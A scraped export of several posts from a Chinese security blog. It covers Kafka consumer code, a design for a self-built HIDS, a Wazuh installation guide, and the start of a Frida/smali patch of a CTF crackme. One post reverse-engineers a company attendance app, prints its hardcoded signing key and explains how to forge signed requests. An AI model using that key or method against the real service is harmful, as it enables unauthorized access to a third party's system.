print(&quot;%s:%d:%d: key&#x3D;%s value&#x3D;%s&quot; % (tp.topic, tp.partition, message.offset, message.key, message.value)) 但是这样做会出现多次获取重复已消费的信息，因为自动位移提交的动作是在 poll() 方法的逻辑里完成的，在每次真正向服务端发起拉取请求之前会检查是否可以进行位移提交，如果可以，那么就会提交上一次轮询的位移。单次请求的时候不能提交offset。 添加如下手动提交已消费信息 from kafka import KafkaConsumer consumer &#x3D; KafkaConsumer( &quot;test&quot;, group_id&#x3D;&#39;user-test&#39;, enable_auto_commit &#x3D; False, bootstrap_servers &#x3D; [ &quot;localhost:9092&quot; ] ) consumer.subscribe(topics&#x3D;(&#39;test&#39;,)) # consumer.subscribe(topics&#x3D;(&#39;test&#39;,&#39;test0&#39;)) #订阅多个主题 msg &#x3D; consumer.poll(timeout_ms&#x3D;2000) # 从kafka获取消息 print(msg) for tp, messages in msg.items(): for message in messages: print(&quot;%s:%d:%d: key&#x3D;%s value&#x3D;%s&quot; % (tp.topic, tp.partition, message.offset, message.key, message.value)) consumer.commit() #同步提交，直到正常或异常返回之前阻塞 consumer.commit_async() #异步提交，不阻塞 读取已消费信息 使用 seek方法从指定的partition和offset开始读取数据，需要记录分区和offset。 #encoding:utf8 from kafka import KafkaConsumer, TopicPartition my_topic &#x3D; &quot;my.topic&quot; # 指定需要消费的主题 consumer &#x3D; KafkaConsumer( bootstrap_servers &#x3D; &quot;192.168.70.221:19092,192.168.70.222:19092,192.168.70.223:19092&quot;, # kafka集群地址 group_id &#x3D; &quot;my.group&quot;, # 消费组id enable_auto_commit &#x3D; True, # 每过一段时间自动提交所有已消费的消息（在迭代时提交） auto_commit_interval_ms &#x3D; 5000, # 自动提交的周期（毫秒） ) consumer.assign([ TopicPartition(topic&#x3D;my_topic, partition&#x3D;0), TopicPartition(topic&#x3D;my_topic, partition&#x3D;1), TopicPartition(topic&#x3D;my_topic, partition&#x3D;2) ]) consumer.seek(TopicPartition(topic&#x3D;my_topic, partition&#x3D;0), 12) # 指定起始offset为12 consumer.seek(TopicPartition(topic&#x3D;my_topic, partition&#x3D;1), 0) # 可以注册多个分区，此分区从第一条消息开始接收 # consumer.seek(TopicPartition(topic&#x3D;my_topic, partition&#x3D;2), 32) # 没有注册的分区上的消息不会被消费 for msg in consumer: # 迭代器，等待下一条消息 print msg # 打印消息 部署kafka配置好需要的参数后 .&#x2F;bin&#x2F;zookeeper-server-start.sh -daemon config&#x2F;zookeeper.properties 就可以看到zookeeper处于监听状态，当然zookeeper这个一般使用集群部署的节点，此处仍然是使用kafka。 .&#x2F;bin&#x2F;kafka-server-start.sh -daemon config&#x2F;server-1.properties","categories":[],"tags":[{"name":"Open Source Security","slug":"Open-Source-Security","permalink":"https://misakikata.github.io/tags/Open-Source-Security/"}]},{"title":"中小型企业自研HIDS简单实现","slug":"中小型企业自研HIDS简单实现","date":"2020-01-10T03:51:09.000Z","updated":"2020-01-10T04:40:12.000Z","comments":true,"path":"2020/01/中小型企业自研HIDS简单实现/","link":"","permalink":"https://misakikata.github.io/2020/01/%E4%B8%AD%E5%B0%8F%E5%9E%8B%E4%BC%81%E4%B8%9A%E8%87%AA%E7%A0%94HIDS%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/","excerpt":"","text":"此HIDS自研面对中小型企业，一般服务器百级。如果对集群部署，系统获取更加完善灵活，服务量级较高可以参考： 驭龙 美团 点融 Wazuh 架构架构采用，一般中小型企业安全人员较少，重视度远不如大型企业，多见“一个人的安全部”。架构不适宜过于复杂，后端开发可以根据实际采用python，go，Java等。web框架，有django，php都可以使用。消息的被动或者主动获取又涉及到是否需要使用ES或者ActiveMQ。这一点后面再讨论。此处使用平安集团分享的一个预警结构流程。 Agentagent的建设是整个流程中最费劲的事情了。需要以下几种特点 可维护性高，获取信息稳定 对系统侵入小，适合多种系统的多版本内核 通道信息安全，进程可维护 支持灵活检测，负载小 便于一键化部署 对于互联网大厂采用的方案多是hook，audit等。hook的侵入性比较高，在没有专门的定制化开发下，中小型企业使用的成本比较高，之前在试图部署驭龙的时候就发现太容易对系统造成崩溃。这是生产系统不能接受的。 如何选择侵入小，兼容高，信息全，成本低就是主要考虑了。 对文件监控上比较好的开源监控也就是aide和inotify-tools。aide是对文件的hash比较来判断文件的改动，无实时性。inotify是实时监控，倾向于此。在实际系统测试上，对各个Linux的发行版兼容性也可以满足需求。 其他信息的获取上，倾向于python库psutil。这是Linux的运维的第三方模块。可以收集很多Linux系统的信息，进程，网络，用户，内存等。可以跟主机做实时的信息获取。而且实现简单，方便跟inotify做联动。 信息推送上，如果考虑实时性，可以使用agent主动推送的信息实现方案，但这样做会面临多服务的压力，延迟，丢失。所以需要对信息做消息处理，就需要消息队列。采用何种方式根据需求选择。 agent被动提供消息，只需要把获取的信息提交到某个特定的地址。比如，此处使用类似ES的信息提供方式，agent获取信息后交给flask以json来展示，server对agent来做守护任务来被动获取。这样，实时性较低，需要对获取的信息做过滤处理。但消息获取上比较稳定。 Serverserver端主要做信息的展示和处理整合，此处直接使用python-django。如果使用被动获取信息，需要server做定时任务，采用任务框架APScheduler来管理定时任务。 简而言之，实现方便，操作简单。server端还真是没有多少值得谈论。 功能虽然名为HIDS，但还是需要一些其他功能，只是agent传输的文件监控和主机的信息仿佛作用较低。而且在监控中可以看到，当服务文件改动较多的时候，提示的预警信息过于频繁。分析较为困难。所以为了便于发现其中存在的问题，使用文件扫描功能，比如Linux下的河马webshell扫描。调用扫描来对预警文件进行判断，但扫描识别率测试中，只有百分之六十到七十左右。识别率是否能接受就看个人情况拉。 同时，对于感染型后门，我增加了一个对威胁信息的检测。从以下地址获取感染IP： http://osint.bambenekconsulting.com https://feodotracker.abuse.ch 通过网络连接来判断是否有类似的感染发生，对于IP的获取同样使用定时任务。 web日志目前想通过web日志的方式来做检测告警，比如，大量文件的变更时，跟web日志做查询，来判断是否是一个外部创建的文件。通过ES日志服务器来整合，但在实现中发现，不一定创建成功的文件就一定在日志中，就像文件重命名。所以此功能具体的实现还有待考究。 如果后期可以发现一种webshell识别较高的情况，可以使用扫描价web日志联合告警的方式来减少预警的情况下，提高准确度。 由于使用上没有采用agent主动推送，没用参考消息队列，后期准备改为推送和消息队列形式，同时增加对文件检测的识别和减少告警。同时希望agent的信息获取可以使用audit的方式。 以下是代码实现，简单到会django就可以做二次修改哦 zeru","categories":[],"tags":[{"name":"Open Source Security","slug":"Open-Source-Security","permalink":"https://misakikata.github.io/tags/Open-Source-Security/"}]},{"title":"逆向打卡APP","slug":"逆向打卡APP","date":"2019-12-28T14:57:04.000Z","updated":"2019-12-28T14:57:06.000Z","comments":true,"path":"2019/12/逆向打卡APP/","link":"","permalink":"https://misakikata.github.io/2019/12/%E9%80%86%E5%90%91%E6%89%93%E5%8D%A1APP/","excerpt":"","text":"公司打卡APP，由于偶尔忘记打卡，所以想做一个能查询是否打卡来提醒自己的脚本，为什么不做自动打卡脚本，担心万一更新出问题，但没有发现，那岂不是很尴尬。 首先抓包，查看查询打卡的请求。 获取其中的参数，其中userid为手机号，rmk3为设备uid，reqssn为固定字符串，所以需要知道加密算法来计算sign fm&#x3D;&lt;fm&gt;&lt;userid&gt;178xxxx&lt;&#x2F;userid&gt;&lt;ver&gt;3.2.0&lt;&#x2F;ver&gt;&lt;rmk1&#x2F;&gt;&lt;rmk2&gt;2&lt;&#x2F;rmk2&gt;&lt;rmk3&gt;8xxxx-xxxx-xxxx-xxxx-BCxxxxxxxx71&lt;&#x2F;rmk3&gt;&lt;action&gt;attendRecord&lt;&#x2F;action&gt;&lt;reqssn&gt;2244f70148454d03baeb739d9c86e082&lt;&#x2F;reqssn&gt;&lt;sign&gt;54bexxxxxx&lt;&#x2F;sign&gt;&lt;&#x2F;fm&gt; 按照惯例，解包后搜索参数名，找到一个sign函数，查看后发现是加密函数，其中部分代码如下，或者uuid，拼接参数 其中有个私钥，记录一下 PRIVATE_KEY &#x3D; &quot;6fcb5584c28743b8ff16337353b0cabe&quot; 继续查看，就可以看到后面还拼接了reqssn，然后通过和私钥的拼接组成新的字符串做一个sha256加密。所以，这个reqssn参数是哪里来的呢，是否是固定值。搜索查看 在其他函数位置发现，reqssn的值，是固定值，且写入代码中。后面的就是上面所说的sign函数。 至于uuid是怎么发现，继续查看相关的代码引用，发现是利用本地读取的文件，打开测试机，找到如下位置，发现保存的uuid 理论上至此，参数值和加密已经得知，但是经过计算还是不一样，继续查看调用的加密，发现其中做了一次base64的编码，然后再sha256加密。 至此能算出加密值和抓包到的结果一致。 如果仔细想想，这个请求中貌似没有变化的量那岂不是只需要做这个请求就可以，干嘛需要加密算法呢。这个请求中没有变化的值，但是登陆中有啊，其中的reqssn就不再是固定值，而是一个当前的时间戳，这时候就需要算法来生成sign。总不能cookie失效一次就抓一次包改一次cookie吧。 登陆的时候参数就是 &lt;fm&gt;&lt;pwd&gt;cxxxxxxxx0b33xxxxxxxxxxxxxx&lt;&#x2F;pwd&gt;&lt;userid&gt;17xxxxxxx&lt;&#x2F;userid&gt;&lt;ver&gt;3.2.0&lt;&#x2F;ver&gt;&lt;rmk1&#x2F;&gt;&lt;rmk2&gt;2&lt;&#x2F;rmk2&gt;&lt;rmk3&gt;ffxxxxxx-xxxx-xxxx-xxxx-xxxxxxx9b&lt;&#x2F;rmk3&gt;&lt;action&gt;login&lt;&#x2F;action&gt;&lt;reqssn&gt;20191225122352145&lt;&#x2F;reqssn&gt;&lt;&#x2F;fm&gt;","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"https://misakikata.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"OSSEC Wazuh","slug":"OSSEC-Wazuh","date":"2019-12-06T05:47:30.000Z","updated":"2019-12-06T05:47:30.000Z","comments":true,"path":"2019/12/OSSEC-Wazuh/","link":"","permalink":"https://misakikata.github.io/2019/12/OSSEC-Wazuh/","excerpt":"","text":"安装Wazuh manager使用Ubuntu系统，目前wazuh版本为3.10 安装文档地址：https://documentation.wazuh.com/3.10/installation-guide/installing-elastic-stack/elastic_server_deb.html 添加更新源apt-get update apt-get install curl apt-transport-https lsb-release #需要python2.7以上 curl -s https:&#x2F;&#x2F;packages.wazuh.com&#x2F;key&#x2F;GPG-KEY-WAZUH | apt-key add - #添加更新源 echo &quot;deb https:&#x2F;&#x2F;packages.wazuh.com&#x2F;3.x&#x2F;apt&#x2F; stable main&quot; | tee -a &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;wazuh.list #更新包 apt-get update 安装Wazuh Managerapt-get install wazuh-manager service wazuh-manager status #检查运行状态 安装Wazuh API如果不能直接安装nodejs需要添加更新源安装 curl -sL https:&#x2F;&#x2F;deb.nodesource.com&#x2F;setup_8.x | bash - apt-get install nodejs apt-get install wazuh-api service wazuh-api status #检查运行状态 sed -i &quot;s&#x2F;^deb&#x2F;#deb&#x2F;&quot; &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;wazuh.list #禁用Wazuh更新源 apt-get update 配置API用户信息，启用HTTPS，可以使用脚本生成证书或者自动生成证书，以下自动生成证书，同时还可以修改访问API的用户，默认用户密码是foo和bar。如需要修改记得重启服务。 # 配置端口账户等信息 cd &#x2F;var&#x2F;ossec&#x2F;api&#x2F;scripts .&#x2F;configure_api.sh #不使用脚本修改 cd &#x2F;var&#x2F;ossec&#x2F;api&#x2F;configuration&#x2F;auth node htpasswd -Bc -C 10 user myUserName 安装FilebeatFilebeat是Wazuh服务器上的工具，可以将警报和归档事件安全地转发到Elastic Stack服务器上的Logstash服务。 添加源存储库和密钥： apt-get install curl apt-transport-https curl -s https:&#x2F;&#x2F;artifacts.elastic.co&#x2F;GPG-KEY-elasticsearch | apt-key add - echo &quot;deb https:&#x2F;&#x2F;artifacts.elastic.co&#x2F;packages&#x2F;7.x&#x2F;apt stable main&quot; | tee &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;elastic-7.x.list apt-get update 安装 apt-get install filebeat&#x3D;7.4.2 从Wazuh存储库下载Filebeat配置文件。这是预先配置的，用于将Wazuh警报转发到Elasticsearch： curl -so &#x2F;etc&#x2F;filebeat&#x2F;filebeat.yml https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;wazuh&#x2F;wazuh&#x2F;v3.10.2&#x2F;extensions&#x2F;filebeat&#x2F;7.x&#x2F;filebeat.yml 下载Elasticsearch的警报模板： curl -so &#x2F;etc&#x2F;filebeat&#x2F;wazuh-template.json https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;wazuh&#x2F;wazuh&#x2F;v3.10.2&#x2F;extensions&#x2F;elasticsearch&#x2F;7.x&#x2F;wazuh-template.json 下载适用于Filebeat的Wazuh模块： curl -s https:&#x2F;&#x2F;packages.wazuh.com&#x2F;3.x&#x2F;filebeat&#x2F;wazuh-filebeat-0.1.tar.gz | sudo tar -xvz -C &#x2F;usr&#x2F;share&#x2F;filebeat&#x2F;module 编辑文件，/etc/filebeat/filebeat.yml并用YOUR_ELASTIC_SERVER_IPElasticsearch服务器的IP地址或主机名替换。例如： output.elasticsearch: hosts: [&quot;192.168.120.128:9200&quot;] 启用并启动Filebeat服务： systemctl daemon-reload systemctl enable filebeat.service systemctl start filebeat.service 安装Elastic Stack添加弹性存储库及其GPG密钥： apt-get install curl apt-transport-https curl -s https:&#x2F;&#x2F;artifacts.elastic.co&#x2F;GPG-KEY-elasticsearch | apt-key add - echo &quot;deb https:&#x2F;&#x2F;artifacts.elastic.co&#x2F;packages&#x2F;7.x&#x2F;apt stable main&quot; | tee &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;elastic-7.x.list apt-get update 安装Elasticsearch软件包： apt-get install elasticsearch&#x3D;7.4.2 需要Java环境，例如安装openjdk apt install openjdk-11-jre-headless 此处网速影响，挂VPS下载软件包解压使用。 如果使用源安装编辑文件/etc/elasticsearch/elasticsearch.yml并取消注释设置，将Elasticsearch配置为侦听非回送地址network.host。将值更改为要绑定到的IP： network.host: &lt;elasticsearch_ip&gt; 更改network.host选项后，需要进一步配置。在文件中添加或编辑（如果有注释）以下几行/etc/elasticsearch/elasticsearch.yml： node.name: &lt;node_name&gt; cluster.initial_master_nodes: [&quot;&lt;node_name&gt;&quot;] 如果使用下载文件包启动方式，编辑文件elasticsearch/config/elasticsearch.yml来执行如上操作。 修改完成后启动ES。 systemctl daemon-reload systemctl enable elasticsearch.service systemctl start elasticsearch.service 文件启动的话，需要非root用户启动 检查启动是否正常 curl http:&#x2F;&#x2F;192.168.120.128:9200 安装Kibana源安装 apt-get install kibana&#x3D;7.4.2 安装适用于Kibana的Wazuh应用程序插件： 从URL安装： sudo -u kibana &#x2F;usr&#x2F;share&#x2F;kibana&#x2F;bin&#x2F;kibana-plugin install https:&#x2F;&#x2F;packages.wazuh.com&#x2F;wazuhapp&#x2F;wazuhapp-3.10.2_7.4.2.zip 从软件包安装： sudo -u kibana &#x2F;usr&#x2F;share&#x2F;kibana&#x2F;bin&#x2F;kibana-plugin install file:&#x2F;&#x2F;&#x2F;path&#x2F;wazuhapp-3.10.2_7.4.2.zip 编辑文件/etc/kibana/kibana.yml，修改设置server.host server.host: &quot;192.168.120.128&quot; &#x2F;&#x2F;修改为主机地址 elasticsearch.hosts: [&quot;http:&#x2F;&#x2F;192.168.120.128:9200&quot;] &#x2F;&#x2F;修改为es的主机地址，此处使用同一台主机 启用并启动Kibana服务： systemctl daemon-reload systemctl enable kibana.service systemctl start kibana.service 禁用Elasticsearch更新： sed -i &quot;s&#x2F;^deb&#x2F;#deb&#x2F;&quot; &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;elastic-7.x.list apt-get update 如果出现Kibana server is not ready yet问题，可能是kibana和es的版本不一致，尝试修改为同一版本，或者是elasticsearch.hosts没有修改为主机的IP，尝试修改为主机IP，再或者是还没刷新成功，等待一会。 选择小狐狸头像，配置API认证，如果修改了则填入设置的账号密码。 下载模版文件 # 下载filebeat配置文件 curl -so &#x2F;etc&#x2F;filebeat&#x2F;filebeat.yml https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;wazuh&#x2F;wazuh&#x2F;v3.9.2&#x2F;extensions&#x2F;filebeat&#x2F;7.x&#x2F;filebeat.yml chmod go+r &#x2F;etc&#x2F;filebeat&#x2F;filebeat.yml # 下载elasticsearch的模版文件 curl -so &#x2F;etc&#x2F;filebeat&#x2F;wazuh-template.json https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;wazuh&#x2F;wazuh&#x2F;v3.9.2&#x2F;extensions&#x2F;elasticsearch&#x2F;7.x&#x2F;wazuh-template.json chmod go+r &#x2F;etc&#x2F;filebeat&#x2F;wazuh-template.json 配置Filebeat output.elasticsearch: hosts: [&#39;http:&#x2F;&#x2F;YOUR_ELASTIC_SERVER_IP:9200&#39;] # 修改为 output.elasticsearch: hosts: [&#39;http:&#x2F;&#x2F;192.168.120.128:9200&#39;] 安装Wazuh agent以上安装可以在一台服务器中，此处agent则需要在需要监控的主机上安装，把agent安装到kali机中。 添加存储库 apt-get install curl apt-transport-https lsb-release gnupg2 安装Wazuh存储库GPG密钥： curl -s https:&#x2F;&#x2F;packages.wazuh.com&#x2F;key&#x2F;GPG-KEY-WAZUH | apt-key add - 添加存储库： echo &quot;deb https:&#x2F;&#x2F;packages.wazuh.com&#x2F;3.x&#x2F;apt&#x2F; stable main&quot; | tee &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;wazuh.list 更新软件包 apt-get update 使用如下安装还需要配置注册，可以手动注册或者脚本注册 apt-get install wazuh-agent https://github.com/wazuh/wazuh-api/blob/master/examples/api-register-agent.sh 使用如下安装和部署，需要携带定义的变量，变量说明列表 https://documentation.wazuh.com/3.10/user-manual/registering/index.html#register-agents WAZUH_MANAGER&#x3D;&quot;192.168.120.128&quot; apt-get install wazuh-agent &#x2F;&#x2F;wazuh-api地址,多个服务使用逗号分隔 或者下载软件包安装，使用脚本注册 https://packages.wazuh.com/3.x/apt/pool/main/w/wazuh-agent/wazuh-agent_3.10.2-1_amd64.deb #!&#x2F;bin&#x2F;bash ### # Shell script for registering agents automatically with the API # Copyright (C) 2017 Wazuh, Inc. All rights reserved. # Wazuh.com # # This program is a free software; you can redistribute it # and&#x2F;or modify it under the terms of the GNU General Public # License (version 2) as published by the FSF - Free Software # Foundation. ### # Connection variables API_IP&#x3D;&quot;192.168.120.128&quot; #wazuh-api 地址 API_PORT&#x3D;&quot;55000&quot; PROTOCOL&#x3D;&quot;http&quot; USER&#x3D;&quot;qweasd&quot; PASSWORD&#x3D;&quot;qweasd&quot; display_help() &#123; cat &lt;&lt;HELP_USAGE $0 [-h] [-f|--force] [-q|--quiet] [agent] -h Show this message. -f|--force Force agent removal (if already registered) The agent will be re-regitered with a new ID -s|--silent Surpress the output while removing the agent agent Agent name (if missing we will use the output of the hostname command) HELP_USAGE &#125; register_agent() &#123; # Adding agent and getting Id from manager echo &quot;&quot; echo &quot;Adding agent:&quot; echo &quot;curl -s -u $USER:**** -k -X POST -d &#39;name&#x3D;$AGENT_NAME&#39; $PROTOCOL:&#x2F;&#x2F;$API_IP:$API_PORT&#x2F;agents&quot; API_RESULT&#x3D;$(curl -s -u $USER:&quot;$PASSWORD&quot; -k -X POST -d &#39;name&#x3D;&#39;$AGENT_NAME $PROTOCOL:&#x2F;&#x2F;$API_IP:$API_PORT&#x2F;agents) echo -e $API_RESULT | grep -q &quot;\\&quot;error\\&quot;:0&quot; 2&gt;&amp;1 if [ &quot;$?&quot; !&#x3D; &quot;0&quot; ]; then echo -e $API_RESULT | sed -rn &#39;s&#x2F;.*&quot;message&quot;:&quot;(.+)&quot;.*&#x2F;\\1&#x2F;p&#39; exit 1 fi # Get agent id and agent key AGENT_ID&#x3D;$(echo $API_RESULT | cut -d&#39;:&#39; -f 4 | cut -d &#39;,&#39; -f 1) AGENT_KEY&#x3D;$(echo $API_RESULT | cut -d&#39;:&#39; -f 5 | cut -d &#39;&#125;&#39; -f 1) echo &quot;Agent &#39;$AGENT_NAME&#39; with ID &#39;$AGENT_ID&#39; added.&quot; echo &quot;Key for agent &#39;$AGENT_ID&#39; received.&quot; # Importing key echo &quot;&quot; echo &quot;Importing authentication key:&quot; echo &quot;y&quot; | &#x2F;var&#x2F;ossec&#x2F;bin&#x2F;manage_agents -i $AGENT_KEY # Restarting agent echo &quot;&quot; echo &quot;Restarting:&quot; echo &quot;&quot; &#x2F;var&#x2F;ossec&#x2F;bin&#x2F;ossec-control restart exit 0 &#125; remove_agent() &#123; echo &quot;Found: $AGENT_ID&quot; echo &quot;Removing previous registration for &#39;$AGENT_NAME&#39; using ID: $AGENT_ID ...&quot; # curl -u foo:bar -k -X DELETE &quot;https:&#x2F;&#x2F;127.0.0.1:55000&#x2F;agents&#x2F;001 REMOVE_AGENT&#x3D;$(curl -s -u $USER:&quot;$PASSWORD&quot; -k -X DELETE $PROTOCOL:&#x2F;&#x2F;$API_IP:$API_PORT&#x2F;agents&#x2F;$AGENT_ID) echo -e $REMOVE_AGENT &#125; get_agent_id() &#123; echo &quot;&quot; echo &quot;Checking for Agent ID...&quot; AGENT_ID&#x3D;$(curl -s -u $USER:&quot;$PASSWORD&quot; -k -X GET $PROTOCOL:&#x2F;&#x2F;$API_IP:$API_PORT&#x2F;agents&#x2F;name&#x2F;$AGENT_NAME | rev | cut -d: -f1 | rev | grep -o &#39;&quot;.*&quot;&#39; | tr -d &#39;&quot;&#39;) &#125; # MAIN # ENTRY POINT while getopts &#39;:hfs&#39; OPTION; do case &quot;$OPTION&quot; in h) display_help exit 0 ;; f|--force) FORCE&#x3D;true ;; s|--silent) SILENT&#x3D;true ;; esac done # reset $1, $2 .... as normal argument after the flag shift $(($OPTIND - 1)) # if no arguments are passed in after the flags, we assign the hostname value to the AGENT_NAME AGENT_NAME&#x3D;$&#123;1:-$(hostname)&#125; get_agent_id # check the return value. If we get an integer back then the agent is already registered. Anything else -&gt; agent is not registered if ! [ &quot;$AGENT_ID&quot; -eq &quot;$AGENT_ID&quot; ] 2&gt; &#x2F;dev&#x2F;null ; then echo &quot;Starting registration process ...&quot; : elif [[ &quot;$FORCE&quot; &#x3D; true &amp;&amp; &quot;$SILENT&quot; &#x3D; &quot;true&quot; ]] ; then remove_agent &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 else if [[ &quot;$FORCE&quot; &#x3D; true ]] ; then remove_agent fi fi # Default action -&gt; try to register the agent register_agent 配置好后，访问wazuh界面中的agent就可以看到连接状态了 在Inventory data中可以看到主机的网卡，网络连接，软件包等信息。 配置文件 /var/ossec/etc/ossec.conf文件完成性监控，同时需要修改server端的获取时间和配置 &lt;frequency&gt;43200&lt;&#x2F;frequency&gt; #默认为十二小时，此处修改为100秒 &lt;!-- File integrity monitoring --&gt; &lt;syscheck&gt; &lt;disabled&gt;no&lt;&#x2F;disabled&gt; #文件完整性监控，默认为no &lt;syscheck&gt; &lt;directories check_all&#x3D;&quot;yes&quot; realtime&#x3D;&quot;yes&quot;&gt;&#x2F;tmp&lt;&#x2F;directories&gt; #实时扫描，仅使用目录 &lt;&#x2F;syscheck&gt; &lt;syscheck&gt; &lt;frequency&gt;36000&lt;&#x2F;frequency&gt; #计划扫描，每十小时一次 &lt;directories&gt;&#x2F;etc,&#x2F;usr&#x2F;bin,&#x2F;usr&#x2F;sbin&lt;&#x2F;directories&gt; #计划扫描的目录 &lt;directories&gt;&#x2F;bin,&#x2F;sbin&lt;&#x2F;directories&gt; &lt;&#x2F;syscheck&gt; &lt;syscheck&gt; #包含了实时扫描，同时带有who-data信息 &lt;directories check_all&#x3D;&quot;yes&quot; whodata&#x3D;&quot;yes&quot;&gt;&#x2F;etc&lt;&#x2F;directories&gt; &lt;&#x2F;syscheck&gt; &lt;rule id&#x3D;&quot;100345&quot; level&#x3D;&quot;12&quot;&gt; #基于规则检测报警，规则id来自Management&#x2F;Ruleset &lt;if_group&gt;syscheck&lt;&#x2F;if_group&gt; &lt;match&gt;&#x2F;var&#x2F;www&#x2F;htdocs&lt;&#x2F;match&gt; &lt;description&gt;Changes to &#x2F;var&#x2F;www&#x2F;htdocs - Critical file!&lt;&#x2F;description&gt; &lt;&#x2F;rule&gt; &lt;directories check_all&#x3D;&quot;yes&quot;&gt;&#x2F;etc,&#x2F;usr&#x2F;bin,&#x2F;usr&#x2F;sbin&lt;&#x2F;directories&gt; #要检查的目录（执行所有可能的验证） &lt;ignore&gt;&#x2F;etc&#x2F;mtab&lt;&#x2F;ignore&gt; #要忽略的目录 如果启用了whodata字段，需要执行以下安装 apt install auditd auditctl -l | grep wazuh_fim #检查是否应用了用于监视所选文件夹的审核规则：-w &#x2F;etc -p wa -k wazuh_fim 命令监控，必须将代理显式配置为接受远程命令，文件/var/ossec/etc/local_internal_options.conf logcollector.remote_commands&#x3D;1 根据文档建议，修改/var/ossec/etc/shared/agent.conf文件，如果包含多个组文件夹，需要到每个组文件夹下修改配置文件，name，os，profile是可以设置。 &lt;agent_config name&#x3D;&quot;agent_name&quot;&gt; &lt;localfile&gt; &lt;location&gt;&#x2F;var&#x2F;log&#x2F;my.log&lt;&#x2F;location&gt; &lt;log_format&gt;syslog&lt;&#x2F;log_format&gt; &lt;&#x2F;localfile&gt; &lt;&#x2F;agent_config&gt; &lt;agent_config os&#x3D;&quot;Linux&quot;&gt; &lt;localfile&gt; &lt;location&gt;&#x2F;var&#x2F;log&#x2F;linux.log&lt;&#x2F;location&gt; &lt;log_format&gt;syslog&lt;&#x2F;log_format&gt; &lt;&#x2F;localfile&gt; &lt;&#x2F;agent_config&gt; &lt;agent_config profile&#x3D;&quot;database&quot;&gt; &lt;localfile&gt; &lt;location&gt;&#x2F;var&#x2F;log&#x2F;database.log&lt;&#x2F;location&gt; &lt;log_format&gt;syslog&lt;&#x2F;log_format&gt; &lt;&#x2F;localfile&gt; &lt;&#x2F;agent_config&gt; &lt;agent_config name&#x3D;&quot;kali&quot;&gt; &lt;localfile&gt; &lt;log_format&gt;command&lt;&#x2F;log_format&gt; #command 指逐行读取 &lt;command&gt;df -P&lt;&#x2F;command&gt; &lt;&#x2F;localfile&gt; &lt;localfile&gt; &lt;log_format&gt;full_command&lt;&#x2F;log_format&gt; #全部匹配查找 &lt;command&gt;netstat -tan |grep LISTEN |egrep -v &#39;(127.0.0.1| ::1)&#39; | sort&lt;&#x2F;command&gt; &lt;&#x2F;localfile&gt; &lt;&#x2F;agent_config&gt; 漏洞检测，需要配置agent端和server端/var/ossec/etc/ossec.conf agent端 &lt;wodle name&#x3D;&quot;syscollector&quot;&gt; &lt;disabled&gt;no&lt;&#x2F;disabled&gt; &lt;interval&gt;1h&lt;&#x2F;interval&gt; &lt;packages&gt;yes&lt;&#x2F;packages&gt; &lt;&#x2F;wodle&gt; server端 &lt;wodle name&#x3D;&quot;vulnerability-detector&quot;&gt; &lt;disabled&gt;no&lt;&#x2F;disabled&gt; &lt;interval&gt;5m&lt;&#x2F;interval&gt; &lt;run_on_start&gt;yes&lt;&#x2F;run_on_start&gt; &lt;feed name&#x3D;&quot;ubuntu-18&quot;&gt; &lt;disabled&gt;no&lt;&#x2F;disabled&gt; &lt;update_interval&gt;1h&lt;&#x2F;update_interval&gt; &lt;&#x2F;feed&gt; &lt;&#x2F;wodle&gt; systemctl restart wazuh-manager #重启 虚拟机当然，如果觉得以上安装过于繁琐，可以选择虚拟机安装一个wazuh服务端，仅在64位系统中运行。不建议在生产中直接使用。 https://packages.wazuh.com/vm/wazuh3.10.2_7.3.2.ova root密码为wazh，api密码为默认的foo/bar。 安装的Elasticsearch /usr/share/elasticsearch。Filebeat安装在中/usr/share/filebeat，其配置文件位于中/etc/filebeat/filebeat.yml。 启动服务和重启相关服务 systemctl restart wazuh-manager systemctl restart wazuh-api systemctl stop elasticsearch systemctl start filebeat systemctl status kibana kibana地址为https://IP，在如下界面中即可看到wazuh做的相关配置检查，和建议。此建议开启tcp_syncookies来处理DOS攻击中的SYN握手的资源消耗。 根据配置文件查看对应配置是否开启，配置默认关闭，根据需求来判断是否开启。","categories":[],"tags":[{"name":"Open Source Security","slug":"Open-Source-Security","permalink":"https://misakikata.github.io/tags/Open-Source-Security/"}]},{"title":"Hook WhyShouldIPay","slug":"Hook-WhyShouldIPay","date":"2019-11-25T09:22:39.000Z","updated":"2021-08-06T08:33:00.220Z","comments":true,"path":"2019/11/Hook-WhyShouldIPay/","link":"","permalink":"https://misakikata.github.io/2019/11/Hook-WhyShouldIPay/","excerpt":"","text":"学习Frida的时候看到小肩膀视频中提到了一个apk，whyshouldipay。这个apk之前做过逆向分析修改，所以正好此处使用Frida来尝试HOOK。 逆向分析把apk丢到jeb中，从mainfast文件。可以看到首页activity是LauncherActivity。找到首页activity，点击反编译。 从代码中可以看到，其实是做了一次网络验证，但由于时间久远，这个apk貌似是16年的CTF使用，网址现在已经不能使用了。所以需要这里进行修改，利用AK来修改smail代码。重打包安装。 .method public verifyClick(Landroid&#x2F;view&#x2F;View;)V .locals 15 .line 39 .restart local v1 # &quot;b&quot;:[B .restart local v2 # &quot;con&quot;:Ljava&#x2F;net&#x2F;URLConnection; .restart local v5 # &quot;in&quot;:Ljava&#x2F;io&#x2F;InputStream; .restart local v9 # &quot;responseBuilder&quot;:Ljava&#x2F;lang&#x2F;StringBuilder; .restart local v11 # &quot;url&quot;:Ljava&#x2F;net&#x2F;URL; :cond_0 const-string v8, &quot;LICENSEKEYOK&quot; .line 40 #.local v8, &quot;response&quot;:Ljava&#x2F;lang&#x2F;String; const-string v12, &quot;LICENSEKEYOK&quot; invoke-virtual &#123;v8, v12&#125;, Ljava&#x2F;lang&#x2F;String;-&gt;equals(Ljava&#x2F;lang&#x2F;Object;)Z move-result v12 if-eqz v12, :cond_1 .line 43 new-instance v0, 